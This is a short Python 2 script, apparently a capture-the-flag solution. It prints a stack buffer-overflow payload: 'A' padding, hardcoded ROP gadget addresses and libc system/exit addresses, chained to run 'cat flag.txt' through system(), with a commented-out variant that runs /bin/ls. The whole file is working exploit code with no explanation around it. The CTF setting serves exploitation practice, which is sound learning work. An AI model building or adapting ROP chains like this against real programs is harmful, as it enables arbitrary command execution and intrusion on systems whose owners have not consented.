import struct

g5 = 0x4006d6
g4 = 0x4006d3
g1 = 0x4006d0
g2 = 0x4006d1
sys = 0x7ffff7a5b590
exit = 0x7ffff7a511e0
#Solution for /bin/ls
#print 'A'*1032 + struct.pack('<Q', g2) + '\x10\x00\x00\x00\x00\x00\x00\x00' + struct.pack('<Q', g4)  + '/bin/ls\x00' + '\x20\x00\x00\x00\x00\x00\x00\x00' + struct.pack('<Q', g1) + struct.pack('<Q', sys)
#Solution for cat flag.txt
print 'A'*1024 + '.txt\x00\x00\x00\x00'  + struct.pack('<Q', g2) + '\x10\x00\x00\x00\x00\x00\x00\x00' + struct.pack('<Q', g4)  + 'cat flag.txt\x00' + 'A'*3  + struct.pack('<Q', g1) + struct.pack('<Q', sys) + struct.pack('<Q', exit)
